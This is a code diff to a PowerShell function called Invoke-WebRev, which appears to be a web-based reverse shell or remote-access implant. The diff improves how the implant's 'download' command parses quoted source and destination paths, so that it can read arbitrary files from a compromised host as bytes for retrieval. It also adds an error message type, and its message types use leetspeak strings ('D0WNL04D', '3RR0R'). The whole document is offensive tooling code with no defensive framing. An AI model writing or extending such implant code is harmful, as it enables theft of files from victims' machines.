@@ -78,11 +78,26 @@ function Invoke-WebRev{
             elseif($cstr.split(" ")[0] -eq "download")
             {
                 $type = '"type":"D0WNL04D"';
-                $commarray = $cstr.split(" ");
                 try
                 {
-                    $pathSrc = $commarray[1];
-                    $pathDst = $commarray[2];
+                    if ($cstr.split(" ").Length -eq 3){
+                        $cstr = $cstr.Replace('"', '');
+                        $pathSrc = $cstr.split(" ")[1];
+                        $pathDst = $cstr.split(" ")[2];
+                    }
+                    elseif ($cstr.Substring($cstr.Length-1) -eq '"'){
+                        if ($cstr.split(' ')[1][0] -eq '"') {
+                            $pathSrc = $cstr.split('"')[1];
+                        } else {
+                            $pathSrc = $cstr.split(' ')[1];
+                        }
+                        $pathDst = $cstr.split('"')[-2];
+                    }
+                    else{
+                        $pathSrc = $cstr.split('"')[1];
+                        $pathDst = $cstr.split(' ')[-1];
+                    }
+
                     if (Test-Path -Path $pathSrc) 
                     {
                         $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
@@ -91,6 +106,7 @@ function Invoke-WebRev{
                     } 
                     else
                     {
+                        $type = '"type":"3RR0R"';
                         $result = '[!] Source file not found!';
                     }
                 }
